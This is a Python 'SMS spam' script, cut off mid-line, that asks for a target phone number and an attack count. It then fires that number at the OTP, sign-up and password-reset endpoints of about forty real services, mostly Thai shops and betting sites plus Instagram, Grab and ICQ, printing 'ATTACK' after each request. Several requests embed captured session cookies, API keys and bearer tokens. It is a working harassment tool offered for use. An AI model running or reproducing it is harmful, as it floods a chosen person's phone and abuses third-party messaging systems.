import requests,json

import random

import os

import time

from pystyle import Colors,Colorate

import threading

from colorama import Fore, init



os.system('cls & mode 51,25 &title SPAM SMS 81 API&')

print(Colorate.Horizontal(Colors.rainbow, """

           ╔═╗╔═╗╔═╗╔╦╗  ╔═╗╔╦╗╔═╗

           ╚═╗╠═╝╠═╣║║║  ╚═╗║║║╚═╗  

           ╚═╝╩  ╩ ╩╩ ╩  ╚═╝╩ ╩╚═╝ 

"""))



phone = input(f"\033[1;3m\033[1;91m  [!]  {Fore.RED}PHONE-NUMBER : \033[1;92m")

jam = int(input(f"\033[1;3m\033[1;91m  [!]  {Fore.RED}NUBER-OF-ATTACK : \033[1;92m"))

print(f"")



def api1():

	requests.post("https://m.thisshop.com/cos/send/code/notice", json={"sessionContext":{"channel":"h5","entityCode":0,"userReferenceNumber":"12w12y11r52gz259ue14rr7g7370239m","localDateTimeText":"20220115182850","riskMessage":"{}","serviceCode":"FLEX0001","superUserId":"sysadmin","tokenKey":"149d5c7bae10304c8aba0da2bbc59cb7","authorizationReason":"","transactionBranch":"TFT_ORG_0000","userId":"","locale":"th-TH"},"noticeType":1,"businessType":"RT0001","phoneNumber":f"66-{phone}"},headers={"content-type": "application/json; charset=UTF-8","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api2():

	headers = {

	    "content-type": "application/x-www-form-urlencoded",

	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",

	    "referer": "https://www.wongnai.com/guest2?_f=signUp&guest_signup_type=phone",

	    "cookie": "_gcl_au=1.1.1123274548.1637746846"

	    }

	requests.post("https://www.wongnai.com/_api/guest.json?_v=6.054&locale=th&_a=phoneLogIn",headers=headers,data=f"phoneno={phone}&retrycount=0")

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api3():

	requests.post("https://gettgo.com/sessions/otp_for_sign_up", data={"mobile_number":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api4():

	requests.post("https://api.true-shopping.com/customer/api/request-activate/mobile_no", data={"username": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api5():

	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api6():

	requests.post("http://b226.com/x/code", data={f"phone":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api7():

	requests.post('https://www.sso.go.th/wpr/MEM/terminal/ajax_send_otp',headers={"User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","Content-Type": "application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With": "XMLHttpRequest","Cookie": "sso_local_storeci_sessions=KHj9a18RowgHYWbh71T2%2FDFAcuC2%2FQaJkguD3MQ1eh%2FlwrUXvpAjJgrm6QKAja4oe7rglht%2BzO6oqblJ4EMJF4pqnY%2BGtR%2F0RzIFGN0Suh1DJVRCMPpP8QtZsF5yDyw6ibCMf2HXs95LvAMi7KUkIeaWkSahmh5f%2F3%2FqcOQ2OW5yakrMGA1mJ5upBZiUdEYNmxUAljcqrg7P3L%2BGAXxxC2u1bO09Oz4qf4ZV9ShO0gz5p5CbkE7VxIq1KUrEavn9Y%2BarQmsh1qIIc51uvCev1U1uyXfC%2F9U7uRl7x%2FVYZYT2pkLd3Q7qnZoSNBL8y9wge8Lt7grySdVLFhw9HB68dTSiOm1K04QhdrprI7EsTLWDHTgYmgyTQDuz63YjHsH5MUVanlfBISU1WXmRTXMKbUjlcl0LPPYUR9KWzrVL7sXcrCX%2FfUwLJIU%2F7MTtDYUx39y1CAREM%2F8dw7AEjcJAOA%3D%3D684b65b9b9dc33a3380c5b121b6c2b3ecb6f1bec; PHPSESSID=1s2rdo0664qpg4oteil3hhn3v2; TS01ac2b25=01584aa399fbfcc6474d383fdc1405e05eaa529fa33e596e5189664eb7dfefe57b927d8801ad40fba49f0adec4ce717dd5eabf08d7080e2b85f34368a92a47e71ef07861a287c40da15c0688649509d7f97eb2c293; _ga=GA1.3.1824294570.1636876684; _gid=GA1.3.1832635291.1636876684"},data=f"dCard=1358231116147&Mobile={phone}&password=098098Az&repassword=098098Az&perPrefix=Mr.&cn=Dhdhhs&sn=Vssbsh&perBirthday=5&perBirthmonth=5&perBirthyear=2545&Email=nickytom5879%40gmail.com&otp_type=OTP&otpvalue=&messageId=REGISTER")

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api8():

	requests.post("https://api.mcshop.com/cognito/me/forget-password",headers={"x-store-token": "mcshop","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","accept": "application/json, text/plain, */*","x-auth-token": "O2d1ZXN0OzkyMDIzOTU7YThmNWMyZDE4YThlOTMzOGMyOGMwYWE5ODQwNTBjY2I7Ozs7","x-api-key": "ZU2QOTDkCV5JYVkWXdYFL8niGXB8l1mq2H2NQof3"},json={"username": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api9():

	requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api10():

	requests.post("https://m.lavagame168.com/api/register-otp",headers={"x-exp-signature": "5ffc0caa4d603200124e4eb1","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","referer": "https://m.lavagame168.com/dashboard/login"},json={"brands_id":"5ffc0caa4d603200124e4eb1","agent_register":"5ffc0d5cdcd4f30012aec3d9","tel": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api11():

	requests.get("https://m.redbus.id/api/getOtp?number="+phone[1:]+"&cc=66&whatsAppOpted=true",headers={"traceparent": "00-7d1f9d70ec75d3fb488d8eb2168f2731-6b243a298da767e5-01","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36"}).text

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api12():

	requests.post("https://api.myfave.com/api/fave/v3/auth",headers={"client_id": "dd7a668f74f1479aad9a653412248b62"},json={"phone":"66"+phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api13():

	requests.post("https://samartbet.com/api/request/otp", data={"phoneNumber":phone,"token":"HFbWhpfhFIGSMVWlhcQ0JNQgAtJ3g3QT43FRpzKhsvGhoHEzo6C1sjaRh1dSxgfEt_URwOHgwabwwWKXgodXd9IBBtZShlPx9rQUNiek5tYDtfB3swTC4KUlVRX0cFWVkNElhjPXVzb3NWBSpvVzofb1ZFLi15c2YrTltsL0FpGSMVGQ9rCRsacxJcemxjajdoch8sfEhoWVlvbVEsQ0tWfhgfOGth"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api14():

	requests.post("https://www.msport1688.com/auth/send_otp", data={"phone":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api15():

	requests.post("http://b226.com/x/code", data={f"phone":phone})

	

def api16():

	requests.post("https://ep789bet.net/auth/send_otp", data={"phone":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api17():

	requests.post("https://www.berlnw.com/reservelogin",data={"p_myreserve": phone}, headers={"Host": "www.berlnw.com", "Connection": "keep-alive", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/x-www-form-urlencoded", "Save-Data": "on", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "https://www.berlnw.com/myaccount", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "th-TH,th;q=0.9,en;q=0.8", "Cookie": "berlnw=s%3AaKEA2ULex-QQ7U6jr0WCQGs-Mz3eJFJn.RsAXcleV2EVFN4j%2BPqDivbqSYAta0UYtyoM65BrxuV0; _referrer_og=https%3A%2F%2Fwww.google.com%2F; _first_pageview=1; _jsuid=4035440860; _ga=GA1.2.766623232.1635154743; _gid=GA1.2.1857466267.1635154743; _gac_UA-90695720-1=1.1635154743.CjwKCAjwq9mLBhB2EiwAuYdMtU_gp7mSvFcH4kByOTGf-LsmLTGujv9qCwMi1xwWSuEiQSOlODmN-RoCMu4QAvD_BwE; _fbp=fb.1.1635154742776.771793600; _gat_gtag_UA_90695720_1=1"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api18():

	requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api19():

	requests.post(f"http://m.vcanbuy.com/gateway/msg/send_regist_sms_captcha?mobile=66-{phone}")

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api20():

	requests.post("https://shop.foodland.co.th/login/generation", data={"phone": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api21():

	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api22():

	requests.post("https://unacademy.com/api/v3/user/user_check/",json={"phone":phone,"country_code":"TH"},headers={}).json()

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api23():

	requests.post("https://shoponline.ondemand.in.th/OtpVerification/VerifyOTP/SendOtp", data={"phone": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api24():

	requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":"0903281894","provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api25():

	requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api26():

	requests.post("https://www.instagram.com/accounts/account_recovery_send_ajax/",data=f"email_or_username={phone}&recaptcha_challenge_field=",headers={"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36","x-csrftoken": "EKIzZefCrMss0ypkr2VjEWZ1I7uvJ9BD"}).json

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api27():

	requests.post("https://th.kerryexpress.com/website-api/api/OTP/v1/RequestOTP/"+phone)

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api28():

	requests.post("https://api.scg-id.com/api/otp/send_otp", headers={"Content-Type": "application/json;charset=UTF-8"},json={"phone_no": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api29():

	requests.post("https://partner-api.grab.com/grabid/v1/oauth2/otp", json={"client_id":"4ddf78ade8324462988fec5bfc5874c2","transaction_ctx":"null","country_code":"TH","method":"SMS","num_digits":"6","scope":"openid profile.read foodweb.order foodweb.rewards foodweb.get_enterprise_profile","phone_number": phone},headers={})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api30():

	requests.post("https://www.konvy.com/ajax/system.php?type=reg&action=get_phone_code", data={"phone": phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api31():

	requests.post("https://ecomapi.eveandboy.com/v10/user/signup/phone", data={"phone": phone,"password":"123456789Az"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api32():

	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.SignUp","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/signup/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}","Password":"098098Az","UserAttributes":[{"Name":"name","Value":"Dbdh"},{"Name":"birthdate","Value":"2005-01-01"},{"Name":"gender","Value":"Male"},{"Name":"phone_number","Value":f"+66{phone[1:]}"},{"Name":"custom:phone_country_code","Value":"+66"},{"Name":"custom:is_agreement","Value":"true"},{"Name":"custom:allow_consent","Value":"true"},{"Name":"custom:allow_person_info","Value":"true"}],"ValidationData":[]})

	requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api33():

	head = {

	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",

	    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",

	    "referer": "https://laopun.com/register",

	    "cookie": "PHPSESSID=q32n008kgetm0tilch7f5qv2qp;_ga=GA1.1.677079826.1639848607;_ga_70EKP2Z28V=GS1.1.1639848607.1.1.1639848745.0"

	    }

	requests.get(f"https://laopun.com/send-sms?id={phone}&otp=5153",headers=head)

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api34():

	requests.post("https://jdbaa.com/api/otp-not-captcha", data={"phone_number":phone})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api35():

	head = {

	    "content-type": "application/json;charset=UTF-8",

	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",

	    "accept": "application/json, text/plain, */*",

	    "referer": "https://www.carsome.co.th/sell-car?gclsrc=aw.ds&&&utm_source=Google&utm_medium=Search&utm_campaign=TH_C2B_Valuation_SmartPhrase_Core_&utm_term=Search_Core_C2B_TH_Perf_Conv_&utm_content=%E0%B8%A3%E0%B8%96%E0%B8%A1%E0%B8%B7%E0%B8%AD%E0%B8%AA%E0%B8%AD%E0%B8%87%E0%B8%A3%E0%B8%B2%E0%B8%84%E0%B8%B2%E0%B8%96%E0%B8%B9%E0%B8%81&gclid=Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB",

	    "cookie": "_gcl_au=1.1.1272461332.1638187764;G_ENABLED_IDPS=google;_ga=GA1.3.808434087.1638187769;__lt__cid=10b9db7a-fed7-4a04-99d2-cdf99ccd76b8;_gid=GA1.3.1113186157.1639742520;_fbp=fb.2.1639742521800.1608632439;ajs_anonymous_id=fc77ca54-b140-4d14-a811-9be694d4dcfa;_hjSessionUser_1895262=eyJpZCI6IjJmYTg1NjkzLTIwYWUtNTQ3ZC1iYTgyLTZjMTZhNDE4N2VjOSIsImNyZWF0ZWQiOjE2Mzk3NDI1MjIzMDAsImV4aXN0aW5nIjp0cnVlfQ==;_cc_id=c18b09fbdfdf3183761afb6f7799f21d;panoramaId_expiry=1640349594875;panoramaId=052fccf0cccc27f1f255389082ee16d53938c5a780adb183ac3642512b6c17dc;_clck=18ofz7k|1|exd|0;skylab_deviceId=IuD7oBeC61H6n41Z1FH3ek;_gcl_aw=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gcl_dc=GCL.1639853869.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;amp_893e6b=IuD7oBeC61H6n41Z1FH3ek...1fn7egd40.1fn7egjki.1.3.4;__lt__sid=f6ad8bda-06d0796d;_gac_UA-70043720-5=1.1639853872.Cj0KCQiAqvaNBhDLARIsAH1Pq53bS1JUOrg_c7AM2rjbL8ROKwGaHxVkCyIhqOPhU5bzui7v2wek3bEaAuooEALw_wcB;_gat_UA-70043720-5=1;_uetsid=23e4ae005f3111ec8d8c79ffb5e7c09b;_uetvid=33f5ca20510d11ec8e1175a84efe64f8;_hjSession_1895262=eyJpZCI6IjY2YWZlZmI0LWMwMDYtNGFkMS1hMWE3LTQ3NDllYmQ2MDNjYSIsImNyZWF0ZWQiOjE2Mzk4NTM4NzU4MDd9;_hjIncludedInPageviewSample=1;_hjAbsoluteSessionInProgress=0;_hjIncludedInSessionSample=0;_clsk=15fms60|1639853877001|1|1|e.clarity.ms/collect"

	    }

	requests.post("https://www.carsome.co.th/website/login/sendSMS", headers=head, json={"username":phone,"optType":0}).json()

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api36():

	head = {

	    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..o2KGFaI9sj29aEhCf9hApg.8hkBGU4xqfvuMOjMnNVDZjwqkjUcapX7Nnm4r5NZ-LsHH54KqovZT8OcwskjsUoh0_8NKc7aBicXTwiVy-yR_lly-2hWlWsxCG8cR-ucaKrjhJPzHMoLHdw8TKNeeIq5kGuyTsmB-WVAxDn7G5-v0Q.RkQDS8sYQYMpTilU1VOz1A",

	    "content-type": "application/json; charset=utf-8",

	    "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",

	    "accept": "*/*",

	    "referer": "https://nocnoc.com/login",

	    "cookie": "_gcl_au=1.1.2015626896.1637433514;_ga=GA1.2.2121914407.1637433515;__lt__cid=4ba7a030-4806-44f7-b0bc-eb65b3b9b13f;_fbp=fb.1.1637433519859.82249249;_hjSessionUser_1027858=eyJpZCI6IjExYjI1OTM1LWExZmItNTNjZS1hN2RlLTc4YmQwMjQzNmRkZCIsImNyZWF0ZWQiOjE2Mzc0MzM1MTkwMjUsImV4aXN0aW5nIjp0cnVlfQ==;ajs_anonymous_id=%22b70a4a48-dc6e-407c-9a31-37cb925d24e0%22;__lt__sid=dfc427cb-21404fe4;_gid=GA1.2.1348859339.1639856210;_gat_gaTracker=1;_hjSession_1027858=eyJpZCI6Ijk5MWY0ZjhlLTI0MjAtNDA2YS05MjM0LTJkYTliMzU4OTBkYyIsImNyZWF0ZWQiOjE2Mzk4NTYyMTIyNzV9;_hjIncludedInSessionSample=0;_hjAbsoluteSessionInProgress=0;cto_bundle=hwhaQ19FRiUyRlI5b0h0T1B5YlBlUG1YQzBEWmlxUDhqWDNBT3Qyc0hKVXBsJTJCazNaUlJFMHVMem5DMEh3OEJYUFNnWUI1MGhiSGVkOG9ab3NoUjNMbSUyRnpUd2N4SWU3Q1lnYkZvUnZsJTJGZTVveldmRWliWW5SYWhrJTJCbkxNTmhOaFBSOGNrQlhDRmUwQVpaVW41Q3ElMkJ0Yk9yNVJjVGclM0QlM0Q;_gat_UA-124531227-1=1"

	    }

	requests.post("https://nocnoc.com/authentication-service/user/OTP?b-uid=1.0.684",headers=head,json={"lang":"th","userType":"BUYER","locale":"th","orgIdfier":"scg","phone":phone,"type":"signup","otpTemplate":"buyer_signup_otp_message","userParams":{"buyerName":"ฟงฟง ฟงฟว"}})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api37():

	requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api38():

	requests.post("https://api.1112delivery.com/api/v1/otp/create", data={'phonenumber': phone,'language': "th"})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api39():

	requests.post("https://gccircularlivingshop.com/sms/sendOtp", json={"grant_type":"otp","username": phone,"password":"","client":"ecommerce"},headers={})

	print(f"\033[1;3m\033[1;91m[ \033[1;3m\033[1;95mATTACK : \033[1;92m{phone} \033[1;91m]")

	

def api40():

	headers={

	    "organizationcode": "lifestyle",

	    "content-type": "application/json"

	    }

	json = {"operationName":"sendOtp","variables":{"input":{"mobileNumber": phone,"phoneCode":"THA-66"}},"query":"mutation sendOtp($input: SendOTPInput!) {\n  sendOTPRegister(input: $input) {\n    token\n    otpReference\n    expirationOn\n    __typename\n  }\n}\n"}

	requests.post("https://graph.firster.com/graphql",headers=headers,jso
